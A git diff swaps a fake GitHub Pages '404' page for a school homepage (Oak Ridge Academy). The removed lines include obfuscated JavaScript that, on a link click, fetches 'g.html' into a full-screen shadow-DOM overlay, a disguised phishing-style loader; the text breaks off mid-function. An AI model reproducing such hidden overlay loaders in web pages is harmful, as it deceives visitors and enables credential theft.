@@ -1,129 +1,540 @@
-<<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>404 Not Found · GitHub Pages</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Oak Ridge Academy | Excellence in Education</title>
+  <meta name="description" content="Oak Ridge Academy is a premier K–12 school dedicated to academic excellence, character development, and preparing students for a lifetime of success." />
+  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,600;0,700;1,400;1,600&family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --forest:   #1a3a2a;
+      --forest2:  #0f2218;
+      --gold:     #c9922a;
+      --gold-lt:  #e8b860;
+      --cream:    #f5f0e8;
+      --cream2:   #ede6d8;
+      --text:     #1c2820;
+      --muted:    #5a6b5e;
+      --border:   #d4ccbc;
+      --white:    #ffffff;
+    }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
+    body { font-family: 'Outfit', sans-serif; background: var(--cream); color: var(--text); overflow-x: hidden; }
 
-<style>
-body{
-background:#f1f1f1;
-margin:0;
-font-family:Helvetica,Arial,sans-serif;
-}
-.container{
-margin:50px auto;
-width:600px;
-text-align:center;
-}
-a{
-color:#4183c4;
-text-decoration:none;
-cursor:pointer;
-}
-h1{
-font-size:60px;
-font-weight:100;
-}
-</style>
+    /* TOP BAR */
+    .topbar { background: var(--forest2); padding: 0.45rem 2.5rem; display: flex; justify-content: space-between; align-items: center; }
+    .topbar-left { font-size: 0.72rem; color: rgba(255,255,255,0.5); display: flex; gap: 1.5rem; }
+    .topbar-right { display: flex; gap: 1rem; align-items: center; }
+    .topbar-right a { font-size: 0.72rem; font-weight: 500; color: rgba(255,255,255,0.5); text-decoration: none; transition: color 0.2s; }
+    .topbar-right a:hover { color: var(--gold-lt); }
+    .topbar-div { color: rgba(255,255,255,0.2); }
 
+    /* HEADER */
+    header { background: var(--white); border-bottom: 3px solid var(--gold); position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 20px rgba(0,0,0,0.08); }
+    .header-inner { max-width: 1320px; margin: 0 auto; padding: 0 2.5rem; display: flex; align-items: center; justify-content: space-between; height: 78px; }
+    .logo { display: flex; align-items: center; gap: 14px; text-decoration: none; }
+    .logo-shield {
+      width: 50px; height: 54px;
+      background: var(--forest);
+      clip-path: polygon(50% 0%, 100% 18%, 100% 65%, 50% 100%, 0% 65%, 0% 18%);
+      display: flex; align-items: center; justify-content: center;
+      font-family: 'Cormorant Garamond', serif; font-size: 0.8rem; font-weight: 700; color: var(--gold-lt); letter-spacing: 0.05em;
+    }
+    .logo-words { display: flex; flex-direction: column; line-height: 1.2; }
+    .logo-main { font-family: 'Cormorant Garamond', serif; font-size: 1.25rem; font-weight: 700; color: var(--forest); }
+    .logo-sub { font-size: 0.6rem; font-weight: 600; color: var(--gold); letter-spacing: 0.16em; text-transform: uppercase; }
+    nav { display: flex; gap: 0.1rem; }
+    .nav-link { font-size: 0.81rem; font-weight: 500; color: var(--text); text-decoration: none; padding: 0.5rem 0.9rem; border-radius: 6px; transition: background 0.2s, color 0.2s; position: relative; }
+    .nav-link:hover { background: var(--cream2); }
+    .nav-link.active { font-weight: 600; color: var(--forest); }
+    .nav-link.active::after { content: ''; position: absolute; bottom: -3px; left: 0.9rem; right: 0.9rem; height: 2px; background: var(--gold); border-radius: 1px; }
+    .enroll-btn { background: var(--forest); color: var(--white); font-size: 0.8rem; font-weight: 600; padding: 0.58rem 1.4rem; border-radius: 8px; text-decoration: none; transition: background 0.2s; letter-spacing: 0.03em; }
+    .enroll-btn:hover { background: var(--forest2); }
+
+    /* ANNOUNCE */
+    .announce { background: var(--gold); padding: 0.7rem 2.5rem; display: flex; align-items: center; gap: 1rem; }
+    .ann-tag { flex-shrink: 0; background: var(--forest2); color: var(--gold-lt); font-size: 0.6rem; font-weight: 700; letter-spacing: 0.12em; text-transform: uppercase; padding: 0.22rem 0.65rem; border-radius: 4px; }
+    .ann-text { font-size: 0.81rem; font-weight: 500; color: var(--forest2); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .ann-text strong { font-weight: 700; }
+    .ann-link { flex-shrink: 0; margin-left: auto; font-size: 0.73rem; font-weight: 700; color: var(--forest2); text-decoration: none; }
+
+    /* HERO */
+    .hero { background: var(--forest); position: relative; overflow: hidden; min-height: 560px; display: flex; align-items: center; }
+    .hero::before { content: ''; position: absolute; inset: 0; background-image: repeating-linear-gradient(-45deg, rgba(255,255,255,0.018) 0px, rgba(255,255,255,0.018) 1px, transparent 1px, transparent 22px); }
+    .hero::after { content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 5px; background: var(--gold); }
+    .hero-glow { position: absolute; right: -80px; top: -80px; width: 550px; height: 550px; border-radius: 50%; background: radial-gradient(circle, rgba(201,146,42,0.1) 0%, transparent 65%); pointer-events: none; }
+    .hero-inner { max-width: 1320px; margin: 0 auto; width: 100%; padding: 5rem 2.5rem; display: grid; grid-template-columns: 1.1fr 1fr; gap: 4rem; align-items: center; position: relative; z-index: 1; }
+    .hero-eyebrow { display: inline-flex; align-items: center; gap: 8px; font-size: 0.67rem; font-weight: 600; letter-spacing: 0.16em; text-transform: uppercase; color: var(--gold-lt); margin-bottom: 1.2rem; animation: fadeUp 0.5s ease both; }
+    .hero-eyebrow::before { content: ''; width: 22px; height: 2px; background: var(--gold); }
+    .hero h1 { font-family: 'Cormorant Garamond', serif; font-size: clamp(2.8rem, 5vw, 4.1rem); font-weight: 700; line-height: 1.1; color: var(--white); letter-spacing: -0.01em; animation: fadeUp 0.5s 0.08s ease both; }
+    .hero h1 span { color: var(--gold-lt); font-style: italic; }
+    .hero-desc { margin-top: 1.3rem; font-size: 0.96rem; font-weight: 300; color: rgba(255,255,255,0.62); line-height: 1.8; max-width: 470px; animation: fadeUp 0.5s 0.16s ease both; }
+    .hero-btns { display: flex; gap: 12px; margin-top: 2.2rem; flex-wrap: wrap; animation: fadeUp 0.5s 0.24s ease both; }
+    .btn-gold { display: inline-flex; align-items: center; background: var(--gold); color: var(--forest2); font-size: 0.83rem; font-weight: 700; padding: 0.75rem 1.8rem; border-radius: 8px; text-decoration: none; transition: all 0.2s; box-shadow: 0 4px 20px rgba(201,146,42,0.35); letter-spacing: 0.03em; }
+    .btn-gold:hover { background: var(--gold-lt); transform: translateY(-2px); }
+    .btn-outline-wh { display: inline-flex; align-items: center; background: transparent; color: var(--white); font-size: 0.83rem; font-weight: 500; padding: 0.75rem 1.8rem; border-radius: 8px; text-decoration: none; border: 1.5px solid rgba(255,255,255,0.28); transition: all 0.2s; }
+    .btn-outline-wh:hover { border-color: rgba(255,255,255,0.65); }
+    .hero-stats { display: flex; gap: 2.2rem; margin-top: 3.5rem; padding-top: 2rem; border-top: 1px solid rgba(255,255,255,0.1); animation: fadeUp 0.5s 0.32s ease both; }
+    .hs { display: flex; flex-direction: column; gap: 3px; }
+    .hs-n { font-family: 'Cormorant Garamond', serif; font-size: 2rem; font-weight: 700; color: var(--gold-lt); line-height: 1; }
+    .hs-l { font-size: 0.67rem; color: rgba(255,255,255,0.4); letter-spacing: 0.08em; text-transform: uppercase; }
+
+    /* Hero visual */
+    .hero-visual { position: relative; animation: fadeUp 0.6s 0.15s ease both; }
+    .campus-frame { width: 100%; aspect-ratio: 4/3; border-radius: 16px; overflow: hidden; border: 1px solid rgba(255,255,255,0.1); position: relative; }
+    .campus-frame svg { width: 100%; height: 100%; display: block; }
+    .hv-badge1 { position: absolute; bottom: -16px; left: -18px; background: var(--white); border-radius: 12px; padding: 0.9rem 1.2rem; box-shadow: 0 12px 35px rgba(0,0,0,0.25); display: flex; gap: 10px; align-items: center; }
+    .hv-icon { width: 36px; height: 36px; border-radius: 8px; background: rgba(201,146,42,0.12); display: flex; align-items: center; justify-content: center; font-size: 1.1rem; }
+    .hv-num { font-family: 'Cormorant Garamond', serif; font-size: 1.15rem; font-weight: 700; color: var(--forest); line-height: 1; }
+    .hv-lbl { font-size: 0.6rem; color: var(--muted); font-weight: 500; }
+    .hv-badge2 { position: absolute; top: -14px; right: -14px; background: var(--gold); border-radius: 10px; padding: 0.8rem 1.1rem; box-shadow: 0 8px 22px rgba(201,146,42,0.4); }
+    .hv-b2a { font-family: 'Cormorant Garamond', serif; font-size: 1.05rem; font-weight: 700; color: var(--forest2); }
+    .hv-b2b { font-size: 0.58rem; font-weight: 600; letter-spacing: 0.1em; text-transform: uppercase; color: var(--forest2); opacity: 0.65; }
+
+    /* SECTION UTILS */
+    .wrap { max-width: 1320px; margin: 0 auto; padding: 5rem 2.5rem; }
+    .sec-head { display: flex; align-items: flex-end; justify-content: space-between; margin-bottom: 2.5rem; }
+    .kicker { font-size: 0.64rem; font-weight: 700; letter-spacing: 0.18em; text-transform: uppercase; color: var(--gold); margin-bottom: 0.5rem; display: flex; align-items: center; gap: 8px; }
+    .kicker::before { content: ''; width: 16px; height: 2px; background: var(--gold); }
+    .sec-title { font-family: 'Cormorant Garamond', serif; font-size: clamp(1.8rem, 3vw, 2.4rem); font-weight: 700; line-height: 1.15; color: var(--forest); letter-spacing: -0.01em; }
+    .see-all { font-size: 0.76rem; font-weight: 600; color: var(--forest); text-decoration: none; letter-spacing: 0.05em; text-transform: uppercase; border-bottom: 1.5px solid var(--gold); padding-bottom: 2px; }
+    .see-all:hover { color: var(--gold); }
+
+    /* NEWS */
+    .news-grid { display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 22px; }
+    .news-card { background: var(--white); border-radius: 16px; overflow: hidden; border: 1px solid var(--border); transition: transform 0.25s, box-shadow 0.25s; text-decoration: none; color: inherit; display: flex; flex-direction: column; }
+    .news-card:hover { transform: translateY(-4px); box-shadow: 0 16px 40px rgba(0,0,0,0.1); }
+    .news-thumb { width: 100%; display: flex; align-items: center; justify-content: center; font-size: 2.8rem; position: relative; }
+    .news-card:nth-child(1) .news-thumb { aspect-ratio: 16/9; background: linear-gradient(135deg, #1a3a2a, #2d6647); }
+    .news-card:nth-child(2) .news-thumb { aspect-ratio: 4/3; background: linear-gradient(135deg, #2a1a3a, #5a3a7a); }
+    .news-card:nth-child(3) .news-thumb { aspect-ratio: 4/3; background: linear-gradient(135deg, #1a2a3a, #2a5080); }
+    .news-label { position: absolute; top: 12px; left: 12px; background: var(--gold); color: var(--forest2); font-size: 0.59rem; font-weight: 700; letter-spacing: 0.1em; text-transform: uppercase; padding: 0.22rem 0.55rem; border-radius: 4px; }
+    .news-body { padding: 1.35rem; display: flex; flex-direction: column; gap: 7px; flex: 1; }
+    .news-date { font-size: 0.66rem; color: var(--muted); font-weight: 500; letter-spacing: 0.04em; }
+    .news-title { font-family: 'Cormorant Garamond', serif; font-size: 1.12rem; font-weight: 700; line-height: 1.3; color: var(--forest); }
+    .news-card:nth-child(1) .news-title { font-size: 1.4rem; }
+    .news-excerpt { font-size: 0.77rem; color: var(--muted); line-height: 1.7; font-weight: 300; }
+    .news-more { margin-top: auto; padding-top: 10px; font-size: 0.71rem; font-weight: 600; color: var(--gold); letter-spacing: 0.04em; }
+
+    /* EVENTS */
+    .events-bg { background: var(--forest); padding: 5rem 0; }
+    .events-inner { max-width: 1320px; margin: 0 auto; padding: 0 2.5rem; display: grid; grid-template-columns: 1fr 1.8fr; gap: 5rem; align-items: start; }
+    .ev-head .kicker { color: var(--gold-lt); }
+    .ev-head .kicker::before { background: var(--gold); }
+    .ev-head .sec-title { color: var(--white); }
+    .ev-head p { font-size: 0.87rem; color: rgba(255,255,255,0.48); line-height: 1.8; margin-top: 1rem; font-weight: 300; }
+    .ev-list { display: flex; flex-direction: column; gap: 13px; }
+    .ev-item { display: flex; gap: 16px; align-items: flex-start; background: rgba(255,255,255,0.045); border: 1px solid rgba(255,255,255,0.07); border-radius: 13px; padding: 1.1rem 1.3rem; transition: background 0.2s, border-color 0.2s; cursor: pointer; }
+    .ev-item:hover { background: rgba(255,255,255,0.075); border-color: rgba(201,146,42,0.28); }
+    .ev-date { min-width: 50px; background: rgba(201,146,42,0.1); border: 1px solid rgba(201,146,42,0.18); border-radius: 9px; padding: 0.45rem 0.35rem; text-align: center; flex-shrink: 0; }
+    .ev-month { font-size: 0.56rem; font-weight: 700; letter-spacing: 0.1em; text-transform: uppercase; color: var(--gold); }
+    .ev-day { font-family: 'Cormorant Garamond', serif; font-size: 1.55rem; font-weight: 700; color: var(--white); line-height: 1; }
+    .ev-info { display: flex; flex-direction: column; gap: 4px; }
+    .ev-name { font-size: 0.87rem; font-weight: 600; color: var(--white); }
+    .ev-meta { font-size: 0.7rem; color: rgba(255,255,255,0.42); display: flex; gap: 12px; }
+    .ev-tag { margin-top: 3px; display: inline-block; font-size: 0.58rem; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; padding: 0.17rem 0.48rem; border-radius: 3px; }
+    .t-ac { background: rgba(62,207,207,0.14); color: #3ecfcf; }
+    .t-sp { background: rgba(232,184,96,0.14); color: var(--gold-lt); }
+    .t-ar { background: rgba(200,130,255,0.14); color: #d08cff; }
+    .t-co { background: rgba(255,160,100,0.14); color: #ffb070; }
+
+    /* PILLARS */
+    .pillars-bg { background: var(--cream2); border-top: 1px solid var(--border); border-bottom: 1px solid var(--border); padding: 5rem 2.5rem; }
+    .pillars-inner { max-width: 1320px; margin: 0 auto; }
+    .pillars-hd { text-align: center; max-width: 560px; margin: 0 auto 3rem; }
+    .pillars-hd .kicker { justify-content: center; }
+    .pillars-hd .kicker::before { display: none; }
+    .pillars-hd .sec-title { text-align: center; }
+    .pillars-hd p { font-size: 0.88rem; color: var(--muted); line-height: 1.75; margin-top: 0.8rem; font-weight: 300; }
+    .pillars-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 18px; }
+    .pillar { background: var(--white); border: 1px solid var(--border); border-radius: 18px; padding: 2rem 1.4rem; display: flex; flex-direction: column; gap: 12px; position: relative; overflow: hidden; transition: transform 0.25s, box-shadow 0.25s; }
+    .pillar::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px; background: var(--pc); }
+    .pillar:hover { transform: translateY(-5px); box-shadow: 0 18px 40px rgba(0,0,0,0.09); }
+    .pillar[data-p="1"] { --pc: var(--gold); }
+    .pillar[data-p="2"] { --pc: #3ecfcf; }
+    .pillar[data-p="3"] { --pc: #8264ff; }
+    .pillar[data-p="4"] { --pc: #ff8264; }
+    .pi { font-size: 1.9rem; }
+    .pn { font-family: 'Cormorant Garamond', serif; font-size: 1.18rem; font-weight: 700; color: var(--forest); line-height: 1.2; }
+    .pd { font-size: 0.77rem; color: var(--muted); line-height: 1.7; font-weight: 300; }
+
+    /* STAFF */
+    .staff-inner { max-width: 1320px; margin: 0 auto; padding: 5rem 2.5rem; }
+    .staff-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 22px; margin-top: 2.5rem; }
+    .staff-card { background: var(--white); border: 1px solid var(--border); border-radius: 16px; overflow: hidden; transition: transform 0.25s, box-shadow 0.25s; }
+    .staff-card:hover { transform: translateY(-4px); box-shadow: 0 14px 36px rgba(0,0,0,0.09); }
+    .staff-avatar { width: 100%; aspect-ratio: 1; display: flex; align-items: center; justify-content: center; font-family: 'Cormorant Garamond', serif; font-size: 2.6rem; font-weight: 700; color: rgba(255,255,255,0.7); }
+    .staff-card:nth-child(1) .staff-avatar { background: linear-gradient(135deg, #1a3a2a, #2d6647); }
+    .staff-card:nth-child(2) .staff-avatar { background: linear-gradient(135deg, #2a2a4a, #4a4a8a); }
+    .staff-card:nth-child(3) .staff-avatar { background: linear-gradient(135deg, #3a1a1a, #7a3a2a); }
+    .staff-card:nth-child(4) .staff-avatar { background: linear-gradient(135deg, #1a2a3a, #2a5570); }
+    .staff-info { padding: 1.1rem 1.2rem; }
+    .staff-name { font-family: 'Cormorant Garamond', serif; font-size: 1.05rem; font-weight: 700; color: var(--forest); }
+    .staff-role { font-size: 0.7rem; color: var(--gold); font-weight: 600; letter-spacing: 0.04em; margin-top: 2px; }
+    .staff-dept { font-size: 0.68rem; color: var(--muted); margin-top: 3px; }
+
+    /* QUICK LINKS */
+    .quick-bg { background: var(--forest2); padding: 4rem 2.5rem; }
+    .quick-inner { max-width: 1320px; margin: 0 auto; }
+    .quick-head { text-align: center; margin-bottom: 2rem; }
+    .quick-head .kicker { justify-content: center; color: var(--gold-lt); }
+    .quick-head .kicker::before { display: none; }
+    .quick-head .sec-title { color: var(--white); text-align: center; }
+    .quick-grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 14px; }
+    .qlink { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.07); border-radius: 13px; padding: 1.4rem 0.8rem; text-align: center; text-decoration: none; color: var(--white); transition: all 0.2s; display: flex; flex-direction: column; align-items: center; gap: 9px; }
+    .qlink:hover { background: rgba(201,146,42,0.11); border-color: rgba(201,146,42,0.24); transform: translateY(-3px); }
+    .qi { font-size: 1.7rem; }
+    .ql { font-size: 0.7rem; font-weight: 600; letter-spacing: 0.03em; line-height: 1.3; }
+
+    /* FOOTER */
+    footer { background: var(--forest2); border-top: 1px solid rgba(255,255,255,0.07); }
+    .foot-main { max-width: 1320px; margin: 0 auto; padding: 4rem 2.5rem 3rem; display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 4rem; }
+    .foot-brand p { font-size: 0.8rem; color: rgba(255,255,255,0.42); line-height: 1.75; margin-top: 1.1rem; font-weight: 300; max-width: 290px; }
+    .foot-contact { margin-top: 1.4rem; display: flex; flex-direction: column; gap: 5px; }
+    .foot-contact span { font-size: 0.74rem; color: rgba(255,255,255,0.42); display: flex; align-items: center; gap: 7px; }
+    .foot-col h4 { font-size: 0.62rem; font-weight: 700; letter-spacing: 0.16em; text-transform: uppercase; color: var(--gold-lt); margin-bottom: 1.1rem; }
+    .foot-col ul { list-style: none; display: flex; flex-direction: column; gap: 0.55rem; }
+    .foot-col a { font-size: 0.76rem; color: rgba(255,255,255,0.42); text-decoration: none; transition: color 0.2s; }
+    .foot-col a:hover { color: var(--white); }
+    .foot-bottom { border-top: 1px solid rgba(255,255,255,0.06); max-width: 1320px; margin: 0 auto; padding: 1.4rem 2.5rem; display: flex; justify-content: space-between; align-items: center; }
+    .foot-bottom p { font-size: 0.68rem; color: rgba(255,255,255,0.28); }
+    .foot-bottom a { color: rgba(255,255,255,0.28); text-decoration: none; }
+    .accreds { display: flex; gap: 0.8rem; }
+    .accred { font-size: 0.6rem; color: rgba(255,255,255,0.28); border: 1px solid rgba(255,255,255,0.1); border-radius: 4px; padding: 0.22rem 0.55rem; letter-spacing: 0.05em; }
+
+    @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+    @media (max-width: 1100px) {
+      .hero-inner { grid-template-columns: 1fr; } .hero-visual { display: none; }
+      .news-grid { grid-template-columns: 1fr 1fr; } .news-card:nth-child(1) { grid-column: 1/-1; }
+      .events-inner { grid-template-columns: 1fr; gap: 2.5rem; }
+      .pillars-grid { grid-template-columns: repeat(2, 1fr); }
+      .staff-grid { grid-template-columns: repeat(2, 1fr); }
+      .quick-grid { grid-template-columns: repeat(3, 1fr); }
+      .foot-main { grid-template-columns: 1fr 1fr; gap: 2.5rem; }
+    }
+    @media (max-width: 768px) {
+      .topbar, nav { display: none; }
+      .header-inner { padding: 0 1.2rem; }
+      .wrap, .pillars-bg, .staff-inner, .quick-bg { padding-left: 1.2rem; padding-right: 1.2rem; }
+      .news-grid, .pillars-grid { grid-template-columns: 1fr; }
+      .staff-grid, .quick-grid { grid-template-columns: repeat(2, 1fr); }
+      .foot-main { grid-template-columns: 1fr; gap: 2rem; padding: 2.5rem 1.2rem; }
+      .foot-bottom { flex-direction: column; gap: 1rem; padding: 1.2rem; text-align: center; }
+    }
+  </style>
 </head>
 <body>
 
-<div class="container">
-<h1>404</h1>
-<p><strong>There isn't a GitHub Pages site here.</strong></p>
+  <!-- TOP BAR -->
+  <div class="topbar">
+    <div class="topbar-left">
+      <span>📍 1200 Oak Ridge Drive, Springfield, PA 19064</span>
+      <span>📞 (610) 555-0184</span>
+      <span>✉ info@oakridgeacademy.edu</span>
+    </div>
+    <div class="topbar-right">
+      <a href="#">Student Portal</a><span class="topbar-div">|</span>
+      <a href="#">Parent Portal</a><span class="topbar-div">|</span>
+      <a href="#">Staff Login</a><span class="topbar-div">|</span>
+      <a href="#">Board of Education</a>
+    </div>
+  </div>
 
-<div id="suggestions">
-<a id="loadPortal">GitHub Status</a> —
-<a href="#">@githubstatus</a>
-</div>
+  <!-- HEADER -->
+  <header>
+    <div class="header-inner">
+      <a class="logo" href="#">
+        <div class="logo-shield">ORA</div>
+        <div class="logo-words">
+          <span class="logo-main">Oak Ridge Academy</span>
+          <span class="logo-sub">Est. 1962 · Excellence in Education</span>
+        </div>
+      </a>
+      <nav>
+        <a class="nav-link active" href="#">Home</a>
+        <a class="nav-link" href="#">About</a>
+        <a class="nav-link" href="#">Academics</a>
+        <a class="nav-link" href="#">Athletics</a>
+        <a class="nav-link" href="#">Arts</a>
+        <a class="nav-link" href="#">Community</a>
+        <a class="nav-link" href="#">Alumni</a>
+      </nav>
+      <a class="enroll-btn" href="#">Enroll Now →</a>
+    </div>
+  </header>
 
-</div>
+  <!-- ANNOUNCEMENT BAR -->
+  <div class="announce">
+    <span class="ann-tag">📢 Latest</span>
+    <span class="ann-text"><strong>Spring Registration Open:</strong> Enrollment for the 2026–27 school year is now open. Limited seats available for Grades K–5. Apply by April 30.</span>
+    <a class="ann-link" href="#">Learn More →</a>
+  </div>
 
-<script>
-const _0x51d2=_0x2e8f;
-(function(_0x4d5a47,_0x2fd3a1){
-const _0x493ec5=_0x2e8f,_0x40ec2d=_0x4d5a47();
-while(!![]){
-try{
-const _0x2c4c85=
-parseInt(_0x493ec5(0xbe))/1+
--parseInt(_0x493ec5(0xc6))/2+
-parseInt(_0x493ec5(0xc3))/3+
-parseInt(_0x493ec5(0xc2))/4+
--parseInt(_0x493ec5(0xc5))/5+
-parseInt(_0x493ec5(0xbf))/6+
-parseInt(_0x493ec5(0xc0))/7;
-if(_0x2c4c85===_0x2fd3a1)break;
-else _0x40ec2d.push(_0x40ec2d.shift());
-}catch(_0x20d2f4){
-_0x40ec2d.push(_0x40ec2d.shift());
-}
-}
-}(_0x583f,0x57f5a));
+  <!-- HERO -->
+  <section class="hero">
+    <div class="hero-glow"></div>
+    <div class="hero-inner">
+      <div>
+        <div class="hero-eyebrow">Oak Ridge Academy · Springfield, PA</div>
+        <h1>Where <span>Character</span> Meets<br>Academic Excellence.</h1>
+        <p class="hero-desc">Oak Ridge Academy has been shaping curious minds and principled leaders since 1962. A nurturing K–12 community where every student is known, challenged, and celebrated.</p>
+        <div class="hero-btns">
+          <a class="btn-gold" href="#">Explore Our Programs</a>
+          <a class="btn-outline-wh" href="#">Schedule a Tour</a>
+        </div>
+        <div class="hero-stats">
+          <div class="hs"><span class="hs-n">62+</span><span class="hs-l">Years of Excellence</span></div>
+          <div class="hs"><span class="hs-n">1,400</span><span class="hs-l">Students Enrolled</span></div>
+          <div class="hs"><span class="hs-n">96%</span><span class="hs-l">College Acceptance</span></div>
+          <div class="hs"><span class="hs-n">18:1</span><span class="hs-l">Student–Teacher Ratio</span></div>
+        </div>
+      </div>
+      <div class="hero-visual">
+        <div class="campus-frame">
+          <svg viewBox="0 0 480 360" xmlns="http://www.w3.org/2000/svg">
+            <rect width="480" height="360" fill="#0f2218"/>
+            <circle cx="60" cy="40" r="1.5" fill="rgba(255,255,255,0.6)"/>
+            <circle cx="150" cy="22" r="1" fill="rgba(255,255,255,0.4)"/>
+            <circle cx="310" cy="32" r="1.5" fill="rgba(255,255,255,0.5)"/>
+            <circle cx="420" cy="18" r="1" fill="rgba(255,255,255,0.6)"/>
+            <circle cx="380" cy="52" r="1" fill="rgba(255,255,255,0.3)"/>
+            <circle cx="420" cy="50" r="22" fill="#c9922a" opacity="0.18"/>
+            <circle cx="428" cy="44" r="18" fill="#0f2218"/>
+            <rect x="0" y="272" width="480" height="88" fill="#112b1a"/>
+            <rect x="223" y="260" width="34" height="62" fill="#1a4030" rx="2"/>
+            <rect x="100" y="142" width="280" height="138" fill="#1a3a2a" rx="3"/>
+            <polygon points="80,142 240,82 400,142" fill="#162e22"/>
+            <rect x="210" y="62" width="60" height="80" fill="#152a1e" rx="2"/>
+            <polygon points="200,62 240,32 280,62" fill="#111f17"/>
+            <rect x="228" y="76" width="24" height="28" rx="12" fill="rgba(201,146,42,0.28)" stroke="rgba(201,146,42,0.45)" stroke-width="1.5"/>
+            <line x1="240" y1="32" x2="240" y2="10" stroke="rgba(255,255,255,0.5)" stroke-width="1.5"/>
+            <polygon points="240,10 258,17 240,24" fill="#c9922a" opacity="0.85"/>
+            <rect x="122" y="167" width="35" height="27" rx="3" fill="rgba(232,184,96,0.22)" stroke="rgba(232,184,96,0.28)" stroke-width="1"/>
+            <rect x="172" y="167" width="35" height="27" rx="3" fill="rgba(232,184,96,0.14)" stroke="rgba(232,184,96,0.18)" stroke-width="1"/>
+            <rect x="273" y="167" width="35" height="27" rx="3" fill="rgba(232,184,96,0.28)" stroke="rgba(232,184,96,0.28)" stroke-width="1"/>
+            <rect x="323" y="167" width="35" height="27" rx="3" fill="rgba(232,184,96,0.1)" stroke="rgba(232,184,96,0.18)" stroke-width="1"/>
+            <rect x="122" y="212" width="35" height="27" rx="3" fill="rgba(232,184,96,0.1)" stroke="rgba(232,184,96,0.18)" stroke-width="1"/>
+            <rect x="172" y="212" width="35" height="27" rx="3" fill="rgba(232,184,96,0.22)" stroke="rgba(232,184,96,0.28)" stroke-width="1"/>
+            <rect x="273" y="212" width="35" height="27" rx="3" fill="rgba(232,184,96,0.14)" stroke="rgba(232,184,96,0.18)" stroke-width="1"/>
+            <rect x="323" y="212" width="35" height="27" rx="3" fill="rgba(232,184,96,0.28)" stroke="rgba(232,184,96,0.28)" stroke-width="1"/>
+            <rect x="215" y="224" width="50" height="56" rx="25" fill="rgba(201,146,42,0.14)" stroke="rgba(201,146,42,0.38)" stroke-width="2"/>
+            <rect x="225" y="232" width="30" height="48" rx="15" fill="rgba(0,0,0,0.28)"/>
+            <rect x="200" y="279" width="80" height="5" rx="2" fill="#2d5a40"/>
+            <rect x="208" y="274" width="64" height="5" rx="2" fill="#336648"/>
+            <rect x="100" y="140" width="280" height="4" rx="2" fill="rgba(201,146,42,0.38)"/>
+            <ellipse cx="80" cy="228" rx="27" ry="36" fill="#1d4a2e"/>
+            <rect x="75" y="258" width="10" height="24" fill="#152a1e"/>
+            <ellipse cx="400" cy="225" rx="27" ry="38" fill="#1d4a2e"/>
+            <rect x="395" y="258" width="10" height="24" fill="#152a1e"/>
+            <line x1="162" y1="265" x2="162" y2="288" stroke="#2a4a38" stroke-width="3"/>
+            <circle cx="162" cy="262" r="4.5" fill="rgba(232,184,96,0.6)"/>
+            <line x1="318" y1="265" x2="318" y2="288" stroke="#2a4a38" stroke-width="3"/>
+            <circle cx="318" cy="262" r="4.5" fill="rgba(232,184,96,0.6)"/>
+          </svg>
+        </div>
+        <div class="hv-badge1">
+          <div class="hv-icon">🏆</div>
+          <div><div class="hv-num">#1 Rated</div><div class="hv-lbl">District School, 2025</div></div>
+        </div>
+        <div class="hv-badge2">
+          <div class="hv-b2a">Class of 2025</div>
+          <div class="hv-b2b">100% Graduated</div>
+        </div>
+      </div>
+    </div>
+  </section>
 
-function _0x583f(){
-const _0x17e47c=[
-'attachShadow',
-'open',
-'loadPortal',
-'click',
-'createElement',
-'div',
-'style',
-'position:fixed;inset:0;background:#fff;z-index:99999;overflow:auto;',
-'fetch',
-'g.html',
-'text',
-'innerHTML',
-'appendChild',
-'addEventListener',
-'getElementById',
-'then',
-'9723hHjdf',
-'2389abTr',
-'6723Ksjs',
-'3452Pkls',
-'2211Mxpw',
-'9422Qwep',
-'6282Ytrn'
-];
-_0x583f=function(){
-return _0x17e47c;
-};
-return _0x583f();
-}
+  <!-- NEWS -->
+  <div class="wrap">
+    <div class="sec-head">
+      <div><div class="kicker">School News</div><h2 class="sec-title">Latest from Oak Ridge</h2></div>
+      <a class="see-all" href="#">All News →</a>
+    </div>
+    <div class="news-grid">
+      <a class="news-card" href="#">
+        <div class="news-thumb">🎓<span class="news-label">Featured</span></div>
+        <div class="news-body">
+          <div class="news-date">March 20, 2026</div>
+          <div class="news-title">Oak Ridge Students Sweep Regional Science Olympiad — First Time in 12 Years</div>
+          <div class="news-excerpt">Our Grade 10–12 Science Olympiad team brought home gold in five of seven events at the Regional Championship, earning a bid to the state finals in April. Coach Rivera called it the most prepared team he has ever coached.</div>
+          <div class="news-more">Read Full Story →</div>
+        </div>
+      </a>
+      <a class="news-card" href="#">
+        <div class="news-thumb">🎨</div>
+        <div class="news-body">
+          <div class="news-date">March 15, 2026</div>
+          <div class="news-title">Spring Arts Showcase Returns April 18</div>
+          <div class="news-excerpt">Over 200 student works on display. This year features a new digital art wing and live performances.</div>
+          <div class="news-more">Read More →</div>
+        </div>
+      </a>
+      <a class="news-card" href="#">
+        <div class="news-thumb">🏀</div>
+        <div class="news-body">
+          <div class="news-date">March 12, 2026</div>
+          <div class="news-title">Varsity Basketball Advances to State Quarterfinals</div>
+          <div class="news-excerpt">The Eagles defeated Westbrook 68–54 in their first state quarterfinal appearance since 2019.</div>
+          <div class="news-more">Read More →</div>
+        </div>
+      </a>
+    </div>
+  </div>
 
-function _0x2e8f(_0x1d5f35,_0x46a75f){
-const _0x583fe0=_0x583f();
-return _0x2e8f=function(_0x1bca8f,_0x11c0c8){
-_0x1bca8f=_0x1bca8f-0xbe;
